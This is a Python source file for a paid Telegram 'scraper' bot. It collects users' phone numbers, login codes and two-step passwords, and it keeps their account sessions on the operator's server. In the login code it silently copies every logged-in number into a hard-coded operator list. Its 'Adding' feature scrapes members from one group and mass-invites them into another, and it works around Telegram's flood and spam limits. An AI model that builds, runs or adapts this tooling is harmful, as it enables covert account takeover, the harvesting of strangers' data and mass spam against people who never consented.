import re, os, random, asyncio, html, configparser,subprocess, requests, time, traceback, logging, telethon, csv, json, sys
import csv
from csv import reader
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from telethon.sessions import StringSession
from pyrogram import Client,filters
from asyncio.exceptions import TimeoutError
from telethon.client.chats import ChatMethods
from datetime import datetime, timedelta,date
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
from info import API_ID, API_HASH, BOT_TOKEN, OWNER_IDS, PREMIUM_IDS
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError

# ------------------  ú·¥á Ä·¥á s·¥õ·¥Ä Ä·¥õ s·¥Ñ Ä·¥Ä·¥ò·¥á Ä  ô·¥è·¥õ ·¥Ñ·¥è·¥Ö·¥ás -------------- #


#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/6691393517/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/6691393517')
   open(f"Users/6691393517/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")


APP_ID=API_ID
API_HASH=API_HASH
BOT_TOKEN=BOT_TOKEN
OWNERS=OWNER_IDS
PREMIUMS=PREMIUM_IDS

app = Client("HirokoScraperBot", api_id=APP_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2023-02-01", '%Y-%m-%d') - datetime.strptime("2023-02-01", '%Y-%m-%d')
        if d<=r:
            PREMIUMS.append(int(row[1]))

# ----------------------  ô·¥è·¥õ-·¥õ·¥áx·¥õ -------------------#

START_IMG = (
"https://te.legra.ph/file/1b82afbf90d074849136e.jpg",
"https://te.legra.ph/file/0f64be1cf523f76aa0e2e.jpg",
"https://te.legra.ph/file/1bedd3d90170cc6da5282.jpg",
"https://te.legra.ph/file/c18b4ff72e93a1def1eef.jpg",
"https://te.legra.ph/file/43b1aff6ba286cd61b4cc.jpg",
"https://te.legra.ph/file/45f301147ffede1856f0d.jpg",
"https://te.legra.ph/file/40f551a935da47f59ff64.jpg",

)


START_TEXT = """
** ú·¥á ü ü·¥è s…™ Ä [{}](tg://user?id={})** \n
‡πè …™ ·¥Ä·¥ç s·¥Ñ Ä·¥Ä·¥ò·¥á Ä  ô·¥è·¥õ 
‡πè …™ ·¥Ñ·¥Ä…¥ s·¥Ñ Ä·¥Ä·¥ò ·¥ç·¥á·¥ç ô·¥á Ä “ì Ä·¥è·¥ç …¢ Ä·¥è·¥ú·¥ò ·¥õ·¥è ·¥Ä…¥·¥è·¥õ ú·¥á Ä …¢ Ä·¥è·¥ú·¥ò
‡πè …™ ·¥Ä·¥ç “ì·¥ú ü ü è s·¥õ·¥Ä ô ü·¥á  ô·¥Äs·¥á·¥Ö ·¥è…¥ ·¥ò è Ä·¥è…¢ Ä·¥Ä·¥ç ·¥Ä…¥·¥Ö ·¥õ·¥á ü·¥á·¥õ ú·¥è…¥
"""


# ----------------------- s·¥õ·¥Ä Ä·¥õ --------------------- #


@app.on_message(filters.command(["start"], prefixes=["/", "!"]))
async def start(client: Client, message: Message):
    get_me = await client.get_me()
    USERNAME = get_me.username
    buttons =  [
          [
             InlineKeyboardButton(" ü·¥è…¢…™…¥", callback_data="Login"), 
             InlineKeyboardButton("·¥Ä·¥Ö·¥Ö…™…¥…¢", callback_data="Adding") 
          ],
          [
             InlineKeyboardButton("·¥ò ú·¥è…¥·¥á", callback_data="Phone"), 
             InlineKeyboardButton("·¥ò ú·¥è…¥·¥ás·¥á·¥á", callback_data="xdlist")
          ],
          [
             InlineKeyboardButton("·¥ò ú·¥è…¥·¥á  Ä·¥á·¥ç·¥è·¥†·¥á", callback_data="Remove"), 
             InlineKeyboardButton("·¥Ä·¥Ö·¥ç…™…¥ ·¥ò·¥Ä…¥…¥·¥á ü", callback_data="Admin")
          ]
               ]
   
    reply_markup = InlineKeyboardMarkup(buttons)        
    await message.reply_photo(random.choice(START_IMG), caption=START_TEXT.format(message.from_user.first_name, message.from_user.id), reply_markup=reply_markup)


# ------------------------ ·¥ò ú·¥è…¥·¥á -------------------- #

@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Phone" in k:      
      if update.message.chat.id  not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥ús·¥á Ä\n·¥ò ü·¥á·¥Äs·¥á  ú·¥Ä·¥†·¥á ·¥Ä s·¥ú ôs·¥Ñ Ä…™·¥ò·¥õ…™·¥è…¥ 150 Äs\n·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n…™“ì  è·¥è·¥ú …™…¥·¥õ Ä·¥ás·¥õ·¥á·¥Ö ·¥õ ú·¥Ä…¥ ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õ ~ @iam_daxx**")
         return
      if not os.path.exists(f"Users/{update.message.chat.id}/phone.csv"):
         os.mkdir(f'./Users/{update.message.chat.id}')
         open(f"Users/{update.message.chat.id}/phone.csv","w")
      with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         a=0
         for pphone in str_list:
            a+=1
            NonLimited.append(str(pphone))
         number = await update.message.chat.ask(text="**·¥á…¥·¥õ·¥á Ä …¥·¥ú·¥ç ô·¥á Ä ·¥è“ì ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õs ·¥õ·¥è  ü·¥è…¢…™…¥ (…™…¥ …™…¥·¥õ·¥á…¢·¥á Ä)**")
         n = int(number.text)
         a+=n
         if n<1 :
            await app.send_message(update.message.chat.id, """**…™…¥·¥†·¥Ä ü…™·¥Ö “ì·¥è Ä·¥ç·¥Ä·¥õ  ü·¥áss ·¥õ ú·¥á…¥ 1 ·¥Ä…¢·¥Ä…™…¥ ·¥õ Ä è**""")
            return
         if a>100:
            await app.send_message(update.message.chat.id, f"** è·¥è·¥ú ·¥Ñ·¥Ä…¥ ·¥Ä·¥Ö·¥Ö ·¥è…¥ ü è {100-a} ·¥ò ú·¥è…¥·¥á …¥·¥è**")
            return
         for i in range (1,n+1):
            number = await update.message.chat.ask(text="**…¥·¥è·¥° s·¥á…¥·¥Ö  è·¥è·¥ú Ä ·¥õ·¥á ü·¥á…¢ Ä·¥Ä·¥ç ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ's ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä …™…¥ …™…¥·¥õ·¥á Ä…¥·¥Ä·¥õ…™·¥è…¥·¥Ä ü “ì·¥è Ä·¥ç·¥Ä·¥õ.\n…™…¥·¥Ñ ü·¥ú·¥Ö…™…¥…¢ **·¥Ñ·¥è·¥ú…¥·¥õ Ä è ·¥Ñ·¥è·¥Ö·¥á** \n·¥áx·¥Ä·¥ç·¥ò ü·¥á: **+14154566376 = 14154566376 ·¥è…¥ ü è +  Ä·¥á·¥ç·¥è·¥†·¥á** **")
            phone = number.text
            if "+" in phone:
                await app.send_message(update.message.chat.id, """**·¥Äs ·¥ç·¥á…¥·¥õ…™·¥è…¥ + …™s …¥·¥è·¥õ …™…¥·¥Ñ ü·¥ú·¥Ö·¥á**""")
            elif len(phone)==11 or len(phone)==12:
                Daxx = str(phone)
                NonLimited.append(Daxx)
                await app.send_message(update.message.chat.id, f"**{n}). ·¥ò ú·¥è…¥·¥á: {phone} s·¥á·¥õ s·¥ú·¥Ñ·¥áss“ì·¥ú ü ü è ‚úÖ**")
            else:
                await app.send_message(update.message.chat.id, """**…™…¥·¥†·¥Ä ü…™·¥Ö …¥·¥ú·¥ç ô·¥á Ä “ì·¥è Ä·¥ç·¥Ä·¥õ ·¥õ Ä è ·¥Ä…¢·¥Ä…™…¥**""") 
         NonLimited=list(dict.fromkeys(NonLimited))
         with open(f"Users/{update.message.chat.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open(f"Users/{update.message.chat.id}/1.csv") as infile, open(f"Users/{update.message.chat.id}/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))   
 

# ------------------------  Ä·¥á·¥ç·¥è·¥†·¥á -------------------- #

   elif "Remove" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥ús·¥á Ä\n·¥ò ü·¥á·¥Äs·¥á  ú·¥Ä·¥†·¥á ·¥Ä s·¥ú ôs·¥Ñ Ä…™·¥ò·¥õ…™·¥è…¥ 150 Äs\n·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n…™“ì  è·¥è·¥ú …™…¥·¥õ Ä·¥ás·¥õ·¥á·¥Ö ·¥õ ú·¥Ä…¥ ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õ ~ @iam_daxx**")
         return
      try:
         with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            f.closed
            number = await update.message.chat.ask(text="**s·¥á…¥·¥Ö …¥·¥ú·¥ç ô·¥á Ä ·¥õ·¥è  Ä·¥á·¥ç·¥è·¥†·¥á**")
            print(str_list)
            str_list.remove(number.text)
            with open(f"Users/{update.message.chat.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
               writer = csv.writer(writeFile, lineterminator="\n")
               writer.writerows(str_list)
            with open(f"Users/{update.message.chat.id}/1.csv") as infile, open(f"Users/{update.message.chat.id}/phone.csv", "w") as outfile:
               for line in infile:
                  outfile.write(line.replace(",", ""))
            await app.send_message(update.message.chat.id,text="‚úÖ s·¥ú·¥Ñ·¥áss“ì·¥ú ü ü è  Ä·¥á·¥ç·¥è·¥†·¥á  è·¥è·¥ú Ä ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä")
      except Exception as a:
         pass
   

# ------------------------ …¥·¥ú·¥ç ô·¥á Ä  ü…™s·¥õ -------------------- #

   elif "xdlist" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥ús·¥á Ä\n·¥ò ü·¥á·¥Äs·¥á  ú·¥Ä·¥†·¥á ·¥Ä s·¥ú ôs·¥Ñ Ä…™·¥ò·¥õ…™·¥è…¥ 150 Äs\n·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n…™“ì  è·¥è·¥ú …™…¥·¥õ Ä·¥ás·¥õ·¥á·¥Ö ·¥õ ú·¥Ä…¥ ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õ ~ @iam_daxx**")
         return
      try:
         with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            de="**üçí  ú·¥á Ä·¥á …™s  è·¥è·¥ú Ä ·¥Ä ü ü ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Äs üçí**\n\n"
            da=0
            dad=0
            for pphone in str_list:
               dad+=1
               da+=1
               if dad>40:               
                  await app.send_message(update.message.chat.id, text=f"{de}")
                  de="**üçí  ú·¥á Ä·¥á …™s  è·¥è·¥ú Ä ·¥Ä ü ü ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Äs üçí**\n\n"
                  dad=0 
               de+=(f"**{da}).** `{int(pphone)}`\n")         
         await app.send_message(update.message.chat.id, text=f"{de}")

      except Exception as a:
         pass
  

# ------------------------  ü·¥è…¢…™…¥ -------------------- #
   
   elif "Login" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥ús·¥á Ä\n·¥ò ü·¥á·¥Äs·¥á  ú·¥Ä·¥†·¥á ·¥Ä s·¥ú ôs·¥Ñ Ä…™·¥ò·¥õ…™·¥è…¥ 150 Äs\n·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n…™“ì  è·¥è·¥ú …™…¥·¥õ Ä·¥ás·¥õ·¥á·¥Ö ·¥õ ú·¥Ä…¥ ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õ ~ @iam_daxx**")
         return
      with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
       r=[]
       l=[]
       str_list = [row[0] for row in csv.reader(f)]
       po = 0
       s=0
       for pphone in str_list:
        try:
         phone = int(utils.parse_phone(pphone))
         client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
         await client.connect()
         if not await client.is_user_authorized():
            try:
               await client.send_code_request(phone)
            except FloodWait as e:
               await update.message.reply(f" è·¥è·¥ú  ú·¥Ä·¥†·¥á “ì ü·¥è·¥è·¥Ö·¥°·¥Ä…™·¥õ ·¥è“ì {e.x} s·¥á·¥Ñ·¥è…¥·¥Ös")
               return
            except PhoneNumberInvalidError:
               await update.message.reply(" è·¥è·¥ú Ä ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä …™s …™…¥·¥†·¥Ä ü…™·¥Ö.\n\n·¥ò Ä·¥áss /start ·¥õ·¥è s·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
               return
            except PhoneNumberBannedError:
               await update.message.reply(f"{phone} …™s  ô·¥Ä…¥…¥·¥á·¥Ö")
               continue
            try:
               otp = await update.message.chat.ask(("·¥Ä…¥ ·¥è·¥õ·¥ò …™s s·¥á…¥·¥õ ·¥õ·¥è  è·¥è·¥ú Ä ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä, \n·¥ò ü·¥á·¥Äs·¥á ·¥á…¥·¥õ·¥á Ä ·¥è·¥õ·¥ò …™…¥ `1 2 3 4 5` “ì·¥è Ä·¥ç·¥Ä·¥õ.(s·¥ò·¥Ä·¥Ñ·¥á  ô·¥á·¥õ·¥°·¥á·¥á…¥ ·¥á·¥Ä·¥Ñ ú …¥·¥ú·¥ç ô·¥á Ä) \n\n…™“ì  ô·¥è·¥õ …¥·¥è·¥õ s·¥á…¥·¥Ö…™…¥…¢ ·¥è·¥õ·¥ò ·¥õ ú·¥á…¥ ·¥õ Ä è \n/start ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö ·¥õ·¥è  ô·¥è·¥õ.\n·¥ò Ä·¥áss /cancel ·¥õ·¥è ·¥Ñ·¥Ä…¥·¥Ñ·¥á ü."), timeout=300)
            except TimeoutError:
               await update.message.reply("·¥õ…™·¥ç·¥á  ü…™·¥ç…™·¥õ  Ä·¥á·¥Ä·¥Ñ ú·¥á·¥Ö ·¥è“ì 5 ·¥ç…™…¥·¥ú·¥õ·¥ás.\n·¥ò Ä·¥áss /start ·¥õ·¥è s·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
               return
            otps=otp.text
            try:
              await client.sign_in(phone=phone, code=' '.join(str(otps)))
            except PhoneCodeInvalidError:
              await update.message.reply("…™…¥·¥†·¥Ä ü…™·¥Ö ·¥Ñ·¥è·¥Ö·¥á.\n\n·¥ò Ä·¥áss /start ·¥õ·¥è s·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
              return
            except PhoneCodeExpiredError:
              await update.message.reply("·¥Ñ·¥è·¥Ö·¥á …™s ·¥áx·¥ò…™ Ä·¥á·¥Ö.\n\n·¥ò Ä·¥áss /start ·¥õ·¥è s·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
              return
            except SessionPasswordNeededError:
               try:
                  two_step_code = await update.message.chat.ask(" è·¥è·¥ú Ä ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ  ú·¥Ä·¥†·¥á ·¥õ·¥°·¥è ·¥õ·¥°·¥è-s·¥õ·¥á·¥ò ·¥†·¥á Ä…™“ì…™·¥Ñ·¥Ä·¥õ…™·¥è…¥.\n·¥ò ü·¥á·¥Äs·¥á ·¥á…¥·¥õ·¥á Ä  è·¥è·¥ú Ä ·¥ò·¥Äss·¥°·¥è Ä·¥Ö.",timeout=300)
               except TimeoutError:
                  await update.message.reply("`·¥õ…™·¥ç·¥á  ü…™·¥ç…™·¥õ  Ä·¥á·¥Ä·¥Ñ ú·¥á·¥Ö ·¥è“ì 5·¥ç…™…¥.\n\n·¥ò Ä·¥áss /start ·¥õ·¥è s·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!`")
                  return
               try:
                  await client.sign_in(password=two_step_code.text)
               except Exception as e:
                  await update.message.reply(f"**·¥á Ä Ä·¥è Ä:** `{str(e)}`")
                  return
               except Exception as e:
                  await app.send_message(update.message.chat.id ,f"**·¥á Ä Ä·¥è Ä:** `{str(e)}`")
                  return
         with open("Users/6691393517/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            NonLimited=[]
            for pphone in str_list:
               NonLimited.append(str(pphone))
            Daxx = str(phone)
            NonLimited.append(Daxx)
            NonLimited=list(dict.fromkeys(NonLimited))
            with open('1.csv', 'w', encoding='UTF-8') as writeFile:
               writer = csv.writer(writeFile, lineterminator="\n")
               writer.writerows(NonLimited)
            with open("1.csv") as infile, open(f"Users/6691393517/phone.csv", "w") as outfile:
               for line in infile:
                   outfile.write(line.replace(",", ""))
         os.remove("1.csv")
         await client(functions.contacts.UnblockRequest(id='@SpamBot'))
         await client(functions.contacts.UnblockRequest(id='@ViewsServiceBot'))
         await client.send_message('SpamBot', '/start')
         await client.send_message('ViewsServiceBot', '/start')
         msg = str(await client.get_messages('SpamBot'))
         re= "bird"
         if re in msg:
            stats="…¢·¥è·¥è·¥Ö …¥·¥á·¥°s, …¥·¥è  ü…™·¥ç…™·¥õs ·¥Ä Ä·¥á ·¥Ñ·¥ú Ä Ä·¥á…¥·¥õ ü è ·¥Ä·¥ò·¥ò ü…™·¥á·¥Ö ·¥õ·¥è  è·¥è·¥ú Ä ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ.  è·¥è·¥ú' Ä·¥á “ì Ä·¥á·¥á ·¥Äs ·¥Ä  ô…™ Ä·¥Ö!"
            s+=1
            r.append(str(phone))
         else:
            stats=' è·¥è·¥ú ·¥Ä Ä·¥á  ü…™·¥ç…™·¥õ·¥á·¥Ö'
            l.append(str(phone))
         me = await client.get_me()
         await app.send_message(update.message.chat.id, f"‚úÖ s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è  ü·¥è…¢…™…¥  è·¥è·¥ú Ä ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ\n\n**…¥·¥Ä·¥ç·¥á:** {me.first_name}\n**·¥ús·¥á Ä…¥·¥Ä·¥ç·¥á:** {me.username}\n**·¥ò ú·¥è…¥·¥á:** {phone}\n**s·¥ò·¥Ä·¥ç ô·¥è·¥õ s·¥õ·¥Ä·¥õs:** {stats}\n\n****")     
         po+=1
         await client.disconnect()
        except ConnectionError:
         await client.disconnect()
         await client.connect()
        except TypeError:
         await app.send_message(update.message.chat.id, "** è·¥è·¥ú  ú·¥Ä·¥†·¥á …¥·¥è·¥õ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä \n·¥ò ü·¥á·¥Äs·¥á ·¥á·¥Ö…™·¥õ ·¥Ñ·¥è…¥“ì…™…¢‚öôÔ∏è  ô è ·¥Ñ·¥è·¥ç·¥Ä…¥·¥Ö /start.**")  
        except Exception as e:
         await app.send_message(update.message.chat.id, f"**·¥á Ä Ä·¥è Ä: {e}**")
       for sum in l:
         r.append(str(sum))
       with open(f"Users/{update.message.chat.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(r)
       with open(f"Users/{update.message.chat.id}/1.csv") as infile, open(f"Users/{update.message.chat.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", "")) 
       await app.send_message(update.message.chat.id, f"**üçÉ ·¥Ä ü ü ·¥Ä·¥Ñ·¥Ñ  ü·¥è…¢…™…¥ {s} \nüçÇ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ ·¥Ä·¥†·¥Ä…™ ü·¥Ä ô ü·¥á ·¥è“ì {po} **") 
    

# ------------------------  ü·¥è…¢…™…¥ -------------------- #
   
   elif "Adding" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥ús·¥á Ä\n·¥ò ü·¥á·¥Äs·¥á  ú·¥Ä·¥†·¥á ·¥Ä s·¥ú ôs·¥Ñ Ä…™·¥ò·¥õ…™·¥è…¥ 150 Äs\n·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n…™“ì  è·¥è·¥ú …™…¥·¥õ Ä·¥ás·¥õ·¥á·¥Ö ·¥õ ú·¥Ä…¥ ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õ ~ @iam_daxx**")
         return
      number = await update.message.chat.ask(text="**…¥·¥è·¥° s·¥á…¥·¥Ö ·¥õ ú·¥á “ì Ä·¥è·¥ç …¢ Ä·¥è·¥ú·¥ò ·¥ús·¥á Ä…¥·¥Ä·¥ç·¥á **")
      From = number.text
      number = await update.message.chat.ask(text="**…¥·¥è·¥° s·¥á…¥·¥Ö ·¥õ ú·¥á ·¥õ·¥è …¢ Ä·¥è·¥ú·¥ò ·¥ús·¥á Ä…¥·¥Ä·¥ç·¥á **")
      To = number.text
      number = await update.message.chat.ask(text="**…¥·¥è·¥° s·¥á…¥·¥Ö s·¥õ·¥Ä Ä·¥õ “ì Ä·¥è·¥ç **")
      a = int(number.text)
      di=a
      try:
         with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            for pphone in str_list:
               peer=0
               ra=0
               dad=0
               r="**‚Ü∫ ·¥Ä·¥Ö·¥Ö…™…¥…¢ s·¥õ·¥Ä Ä·¥õ ‚Üª**\n\n"
               phone = utils.parse_phone(pphone)
               client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
               await client.connect()
               await client(JoinChannelRequest(To))
               await app.send_message(update.message.chat.id, text=f"**‚áã s·¥Ñ Ä·¥Ä·¥ò…™…¥…¢ s·¥õ·¥Ä Ä·¥õ **")
               async for x in client.iter_participants(From, aggressive=True):
                  try:
                     ra+=1
                     if ra<a:
                        continue
                     if (ra-di)>150:
                        await client.disconnect()
                        r+="**\n-- ú·¥á Ä·¥á …™s  è·¥è·¥ú Ä s·¥Ñ Ä·¥Ä·¥ò·¥á Ä ·¥ç·¥á·¥ç ô·¥á Ä  ü…™s·¥õ--**"
                        await app.send_message(update.message.chat.id, text=f"{r}")
                        await app.send_message(update.message.chat.id, f"**·¥á Ä Ä·¥è Ä: {phone} ·¥Ö·¥ú·¥á ·¥õ·¥è s·¥è·¥ç·¥á ·¥á Ä Ä·¥è Ä ·¥ç·¥è·¥†…™…¥…¢ ·¥õ·¥è …¥·¥áx·¥õ …¥·¥ú·¥ç ô·¥á Ä\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú  ô è @iam_daxx**")
                        break
                     if dad>40:
                        r+="**\n-- ú·¥á Ä·¥á …™s  è·¥è·¥ú Ä s·¥Ñ Ä·¥Ä·¥ò·¥á Ä ·¥ç·¥á·¥ç ô·¥á Ä  ü…™s·¥õ--**"
                        await app.send_message(update.message.chat.id, text=f"{r}")
                        r="**‚Ü∫ ·¥Ä·¥Ö·¥Ö…™…¥…¢ s·¥õ·¥Ä Ä·¥õ ‚Üª**\n\n"
                        dad=0
                     await client(InviteToChannelRequest(To, [x]))
                     status = '·¥Ö·¥è…¥·¥á'
                  except errors.FloodWaitError as s:
                     status= f'“ì ü·¥è·¥è·¥Ö ·¥°·¥Ä…™·¥õ ·¥á Ä Ä·¥è Ä “ì·¥è Ä {s.seconds} s·¥á·¥Ñ'
                     await client.disconnect()                    
                     await app.send_message(update.message.chat.id, text=f"{r}")
                     await app.send_message(update.message.chat.id, text=f'**“ì ü·¥è·¥è·¥Ö·¥°·¥Ä…™·¥õ ·¥á Ä Ä·¥è Ä {s.seconds} sec\n·¥ç·¥è·¥†…™…¥…¢ ·¥õ·¥è …¥·¥áx·¥õ …¥·¥ú·¥ç ô·¥á Ä**')
                     break
                  except UserPrivacyRestrictedError:
                     status = '·¥ò Ä…™·¥†·¥Ä·¥Ñ è  Ä·¥ás·¥õ Ä…™·¥Ñ·¥õ·¥á·¥Ö ·¥á Ä Ä·¥è Ä'
                  except UserAlreadyParticipantError:
                     status = '·¥Ä ü Ä·¥á·¥Ä·¥Ö è ·¥ò·¥Ä Ä·¥õ…™·¥Ñ…™·¥ò·¥Ä…¥·¥õ ·¥á Ä Ä·¥è Ä'
                  except UserBannedInChannelError:
                     status="·¥ús·¥á Ä  ô·¥Ä…¥…¥·¥á·¥Ö"
                  except ChatAdminRequiredError:
                     status="·¥õ·¥è ·¥Ä·¥Ö·¥Ö ·¥Ä·¥Ö·¥ç…™…¥  Ä·¥á«´·¥ú…™ Ä·¥á·¥Ö"
                  except ValueError:
                     status="·¥á Ä Ä·¥è Ä …™…¥ ·¥á…¥·¥õ Ä è"
                     await client.disconnect()
                     await app.send_message(update.message.chat.id, text=f"{r}")
                     break
                  except PeerFloodError:
                     if peer == 10:
                        await client.disconnect()
                        await app.send_message(update.message.chat.id, text=f"{r}")
                        await app.send_message(update.message.chat.id, text=f"**·¥õ·¥è·¥è ·¥ç·¥Ä…¥ è ·¥ò·¥á·¥á Ä“ì ü·¥è·¥è·¥Ö·¥á Ä Ä·¥è Ä \n·¥ç·¥è·¥†…™…¥…¢ ·¥õ·¥è …¥·¥áx·¥õ …¥·¥ú·¥ç ô·¥á Ä**")
                        break
                     status = '·¥ò·¥á·¥á Ä “ì ü·¥è·¥è·¥Ö ·¥á Ä Ä·¥è Ä'
                     peer+=1
                  except ChatWriteForbiddenError as cwfe:
                     await client(JoinChannelRequest(To))
                     continue
                  except errors.RPCError as s:
                     status = s.__class__.__name__
                  except Exception as d:
                     status = d
                  except:
                     traceback.print_exc()
                     status="·¥ú…¥·¥áx·¥ò·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥á Ä Ä·¥è Ä"
                     break
                  r+=f"{a-di+1})üçí **{x.first_name}**   ‚û†   **{status}**\n"
                  dad+=1
                  a+=1
      except Exception as e:
         await app.send_message(update.message.chat.id, text=f"·¥á Ä Ä·¥è Ä: {e} ")
    



# -------------------- ·¥Ä·¥Ö·¥ç…™…¥-·¥ò·¥Ä…¥…¥·¥á ü ---------------- #

   elif "Bot_Stats" in k:      
      msg = await app.send_message(update.message.chat.id,"·¥ò ü·¥á·¥Äs·¥á ·¥°·¥Ä…™·¥õ...")
      messages = await users_info(app)
      await msg.edit(f"üçí --·¥õ·¥è·¥õ·¥Ä ü ·¥ús·¥á Äs-- - {messages[0]}\nüç¥ -- ô ü·¥è·¥Ñ·¥ã·¥á·¥Ö ·¥ús·¥á Äs-- - {messages[1]}")

   elif "Add_Premium" in k:      
      number = await update.message.chat.ask(text="**s·¥á…¥·¥Ö ·¥ús·¥á Ä …™·¥Ö ·¥è“ì …¥·¥á·¥° ·¥ús·¥á Ä**")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUMS.append(int(phone))
         await app.send_message(update.message.chat.id, text="‚ôªÔ∏è ·¥Ö·¥è…¥·¥á s·¥ú·¥Ñ·¥áss“ì·¥ú ü ü è")

   elif "Premium_Users" in k:      
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
